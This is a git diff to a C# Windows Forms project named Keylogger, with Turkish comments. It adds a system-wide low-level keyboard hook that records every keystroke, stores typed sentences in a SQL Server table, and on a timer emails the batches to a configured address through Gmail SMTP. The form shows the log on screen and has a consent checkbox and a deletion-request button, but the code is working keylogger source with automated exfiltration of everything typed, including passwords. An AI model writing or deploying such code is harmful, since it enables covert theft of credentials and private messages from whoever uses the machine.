@@ -11,22 +11,50 @@ using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Data.SqlClient;
+using System.Net;
+using System.Net.Mail;
+using System.Configuration;
 
 namespace Keylogger
 {
     public partial class Form1 : Form
     {
-        static readonly int WH_KEYBOARD_LL = 13;
-        static int hHook = 0;
-        static StringBuilder buffer = new StringBuilder(256);
+        
+        private readonly string DbConnectionString = "Data Source=.;Initial Catalog=DboKeylogger;Integrated Security=True";
 
+
+        private readonly string smtpUser = ConfigurationManager.AppSettings["SmtpUser"];
+        private readonly string smtpAppPassword = ConfigurationManager.AppSettings["SmtpAppPassword"];
+        private readonly string smtpTo = ConfigurationManager.AppSettings["SmtpTo"];
+        private readonly int sendBatchSize = int.Parse(ConfigurationManager.AppSettings["SendBatchSize"]);
+        private readonly int maxSendAttempts = int.Parse(ConfigurationManager.AppSettings["MaxSendAttempts"]);
+        private readonly int sendIntervalMinutes = int.Parse(ConfigurationManager.AppSettings["SendIntervalMinutes"]);
+
+
+
+        
+
+        static readonly int WH_KEYBOARD_LL = 13;
+        static IntPtr hHook = IntPtr.Zero;
+        static HookProc _hookProc = KbdHook; 
         delegate int HookProc(int code, IntPtr wParam, IntPtr lParam);
 
+        private static StringBuilder buffer = new StringBuilder(4096);
+        private static readonly object bufferLock = new object();
+
+   
+        private System.Windows.Forms.Timer sendTimer;
+
+   
         [DllImport("user32.dll", SetLastError = true)]
         static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
 
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
         [DllImport("user32.dll")]
-        static extern int CallNextHookEx(int hHook, int nCode, IntPtr wParam, IntPtr lParam);
+        static extern int CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);
 
         [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
         static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -63,7 +91,6 @@ namespace Keylogger
 
         static readonly int ShiftKey = 16;
         static readonly int CapitalKey = 20;
-        static readonly int ControlKey = 17;
         static readonly int MenuKey = 18;
         static readonly int VK_CAPITAL = 0x14;
         static readonly int MASK_UP = (1 << 15);
@@ -72,21 +99,87 @@ namespace Keylogger
         static bool capital_active() => (GetKeyState(VK_CAPITAL) & 1) == 1;
         static bool menu_active() => (GetKeyState(MenuKey) & 1) == 1;
 
+        public Form1()
+        {
+            InitializeComponent();
+
+
+            sendTimer = new System.Windows.Forms.Timer();
+            sendTimer.Interval = sendIntervalMinutes * 60 * 1000; // dakika → ms
+            sendTimer.Tick += async (s, e) =>
+            {
+                await Task.Run(() => SendPendingLogsBatch(sendBatchSize));
+            };
+            sendTimer.Start();
+
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            
+            IntPtr hMod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
+            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, hMod, 0);
+
+            
+            Task.Run(() => SendPendingLogsBatch(sendBatchSize));
+
+            
+            sendTimer.Start();
+        }
+
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+           
+            try { sendTimer?.Stop(); } catch { }
+
+            
+            try
+            {
+                lock (bufferLock)
+                {
+                    if (buffer.Length > 0)
+                    {
+                        string leftover = buffer.ToString().Trim();
+                        if (!string.IsNullOrEmpty(leftover))
+                        {
+                            CumleyiKaydet(leftover);
+                            buffer.Clear();
+                        }
+                    }
+                }
+            }
+            catch { /* ignore */ }
+
+            
+            try
+            {
+                if (hHook != IntPtr.Zero)
+                {
+                    UnhookWindowsHookEx(hHook);
+                    hHook = IntPtr.Zero;
+                }
+            }
+            catch { /* ignore */ }
+
+            base.OnFormClosing(e);
+        }
+
+        
         public static int KbdHook(int code, IntPtr wParam, IntPtr lParam)
         {
             if (code < 0)
                 return CallNextHookEx(hHook, code, wParam, lParam);
 
             int c = (int)wParam;
-            KBDLLHOOKSTRUCT kbd = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
-            bool onKey = (c == 0x100 || c == 0x104); // WM_KEYDOWN, WM_SYSKEYDOWN
+            bool onKey = (c == 0x100 || c == 0x104);
 
             if (onKey)
             {
+                KBDLLHOOKSTRUCT kbd = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
+
                 byte[] keyboardState = new byte[256];
                 bool shift_on = shift_active();
                 bool caps_on = capital_active();
-                bool menu_on = menu_active();
 
                 GetKeyboardState(keyboardState);
                 keyboardState[ShiftKey] = (byte)(shift_on ? 0xff : 0);
@@ -99,43 +192,244 @@ namespace Keylogger
                 {
                     string pressedKey = buf.ToString();
 
-                    buffer.Append(buf.ToString());
-                    if (Regex.IsMatch(pressedKey, @"[.!?]"))
-                        pressedKey += Environment.NewLine;
-
                     if (Application.OpenForms["Form1"] is Form1 form)
                     {
-                        form.Invoke((MethodInvoker)(() => form.rtxtLog.AppendText(pressedKey)));
+                        form.BeginInvoke((MethodInvoker)(() => form.rtxtLog.AppendText(pressedKey)));
+                    }
+
+                    lock (bufferLock)
+                    {
+                        buffer.Append(pressedKey);
+
+                        
+                        if (Regex.IsMatch(pressedKey, @"[.!?\r\n]"))
+                        {
+                            string sentence = buffer.ToString().Trim();
+                            buffer.Clear();
+
+                            if (!string.IsNullOrWhiteSpace(sentence) && Application.OpenForms["Form1"] is Form1 frm)
+                            {
+                                
+                                frm.BeginInvoke((MethodInvoker)(() => frm.CumleyiKaydet(sentence)));
+                            }
+                        }
                     }
                 }
                 else if (res == -1)
                 {
+                   
                     ToUnicode(kbd.vkCode, kbd.scanCode, keyboardState, new StringBuilder(256), 256, 0);
                 }
             }
+
             return CallNextHookEx(hHook, code, wParam, lParam);
         }
 
-        public Form1()
+        public void CumleyiKaydet(string cumle)
         {
-            InitializeComponent();
+            try
+            {
+                using (SqlConnection con = new SqlConnection(DbConnectionString))
+                using (SqlCommand cmd = new SqlCommand("INSERT INTO TBL_LOGGER (logl, tarih, gonderildi, sendAttempts) VALUES (@logl, @tarih, 0, 0)", con))
+                {
+                    cmd.Parameters.AddWithValue("@logl", cumle);
+                    cmd.Parameters.AddWithValue("@tarih", DateTime.Now);
+                    con.Open();
+                    cmd.ExecuteNonQuery();
+                }
+
+               
+                if (rtxtLog.InvokeRequired)
+                    rtxtLog.Invoke((MethodInvoker)(() => rtxtLog.AppendText(Environment.NewLine + "[KAYIT ALINDI] " + DateTime.Now.ToString("HH:mm:ss") + Environment.NewLine)));
+                else
+                    rtxtLog.AppendText(Environment.NewLine + "[KAYIT ALINDI] " + DateTime.Now.ToString("HH:mm:ss") + Environment.NewLine);
+            }
+            catch (Exception ex)
+            {
+                
+                Debug.WriteLine("CumleyiKaydet hata: " + ex.Message);
+            }
         }
 
-        private void Form1_Load(object sender, EventArgs e)
+        private List<(int id, string text, DateTime time, int attempts)> GetPendingLogsBatch(int top)
         {
-            IntPtr hMod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
-            SetWindowsHookEx(WH_KEYBOARD_LL, new HookProc(KbdHook), hMod, 0);
+            var list = new List<(int, string, DateTime, int)>();
+            string query = @"SELECT TOP(@top) logId, logl, tarih, sendAttempts 
+                             FROM TBL_LOGGER 
+                             WHERE gonderildi = 0 AND sendAttempts < @maxAttempts
+                             ORDER BY logId ASC";
+
+            using (SqlConnection conn = new SqlConnection(DbConnectionString))
+            using (SqlCommand cmd = new SqlCommand(query, conn))
+            {
+                cmd.Parameters.AddWithValue("@top", top);
+                cmd.Parameters.AddWithValue("@maxAttempts", maxSendAttempts);
+                conn.Open();
+                using (var rdr = cmd.ExecuteReader())
+                {
+                    while (rdr.Read())
+                    {
+                        int id = (int)rdr["logId"];
+                        string text = rdr["logl"] as string ?? "";
+                        DateTime time = rdr["tarih"] == DBNull.Value ? DateTime.MinValue : (DateTime)rdr["tarih"];
+                        int attempts = rdr["sendAttempts"] == DBNull.Value ? 0 : (int)rdr["sendAttempts"];
+                        list.Add((id, text, time, attempts));
+                    }
+                }
+            }
+
+            return list;
         }
 
+        private void MarkAsSent(IEnumerable<int> ids)
+        {
+            if (!ids.Any()) return;
+            string query = "UPDATE TBL_LOGGER SET gonderildi = 1 WHERE logId IN (" + string.Join(",", ids) + ")";
+
+            using (SqlConnection conn = new SqlConnection(DbConnectionString))
+            using (SqlCommand cmd = new SqlCommand(query, conn))
+            {
+                conn.Open();
+                cmd.ExecuteNonQuery();
+            }
+        }
+
+        private void IncrementAttempts(IEnumerable<int> ids)
+        {
+            if (!ids.Any()) return;
+            string query = "UPDATE TBL_LOGGER SET sendAttempts = sendAttempts + 1 WHERE logId IN (" + string.Join(",", ids) + ")";
+
+            using (SqlConnection conn = new SqlConnection(DbConnectionString))
+            using (SqlCommand cmd = new SqlCommand(query, conn))
+            {
+                conn.Open();
+                cmd.ExecuteNonQuery();
+            }
+        }
+
+        public void SendPendingLogsBatch(int batchSize = 15)
+        {
+            try
+            {
+                var pending = GetPendingLogsBatch(batchSize);
+                if (pending == null || pending.Count == 0)
+                {
+                    Debug.WriteLine("Gönderilecek bekleyen kayıt yok veya hepsi deneme sınırını aştı.");
+                    return;
+                }
+
+                // E-posta içeriği
+                var sb = new StringBuilder();
+                sb.AppendLine("Aşağıdaki kayıtlar gönderiliyor:");
+                sb.AppendLine();
+                foreach (var p in pending)
+                {
+                    sb.AppendLine($"{p.time:yyyy-MM-dd HH:mm:ss} - {p.text}");
+                    sb.AppendLine(new string('-', 40));
+                }
+
+                bool sent = false;
+                try
+                {
+                    SendEmail_WithGmailSmtp(smtpUser, smtpAppPassword, smtpTo, $"Log Gönderimi - {DateTime.Now:yyyy-MM-dd HH:mm}", sb.ToString());
+                    sent = true;
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine("E-posta gönderim hatası: " + ex.Message);
+                    sent = false;
+                }
+
+                var ids = pending.Select(x => x.id).ToList();
+
+                if (sent)
+                {
+                    MarkAsSent(ids);
+                    Debug.WriteLine($"Başarıyla gönderildi: {ids.Count} kayıt.");
+                }
+                else
+                {
+                    IncrementAttempts(ids);
+                    Debug.WriteLine($"Gönderilemedi. Deneme sayısı artırıldı: {ids.Count} kayıt.");
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine("SendPendingLogsBatch hata: " + ex.Message);
+            }
+        }
+
+        private void SendEmail_WithGmailSmtp(string smtpUserLocal, string smtpAppPasswordLocal, string toEmail, string subject, string body)
+        {
+            var fromAddress = new MailAddress(smtpUserLocal, "Logger App");
+            var toAddress = new MailAddress(toEmail);
+
+            using (var smtp = new SmtpClient
+            {
+                Host = "smtp.gmail.com",
+                Port = 587,
+                EnableSsl = true,
+                DeliveryMethod = SmtpDeliveryMethod.Network,
+                UseDefaultCredentials = false,
+                Credentials = new NetworkCredential(smtpUserLocal, smtpAppPasswordLocal),
+                Timeout = 30000
+            })
+            using (var msg = new MailMessage(fromAddress, toAddress)
+            {
+                Subject = subject,
+                Body = body,
+                IsBodyHtml = false
+            })
+            {
+                smtp.Send(msg);
+            }
+        }
         private void llbnProjeLink_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            Process.Start("chrome", "Github.com");
+            Process.Start("chrome", "https://github.com");
         }
 
         private void llbnProfilLink_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            Process.Start("chrome", "Github.com/BilalAbic");
+            Process.Start("chrome", "https://github.com/BilalAbic");
         }
-         
+
+
+       
+        private void btnOnay_Click(object sender, EventArgs e)
+        {
+            try
+            {
+               
+                if (!rbtOnay.Checked)
+                {
+                    MessageBox.Show("Lütfen onay kutusunu işaretleyin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    return;
+                }
+
+               
+                string userEmail = txtEmail.Text.Trim();
+                if (string.IsNullOrEmpty(userEmail))
+                {
+                    MessageBox.Show("Lütfen e-posta adresinizi girin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    return;
+                }
+
+                
+                string subject = "Veri Silme Talebi";
+                string body = $"Merhaba,\n\n{userEmail} e-posta adresine ait kullanıcı verilerinin silinmesini talep ediyorum.\n\nTeşekkürler.";
+
+                
+                SendEmail_WithGmailSmtp(smtpUser, smtpAppPassword, smtpUser, subject, body);
+
+                MessageBox.Show("Talebiniz gönderildi.", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Mail gönderim hatası: " + ex.Message, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                Debug.WriteLine("Veri silme talebi gönderim hatası: " + ex.Message);
+            }
+        }
+
     }
 }
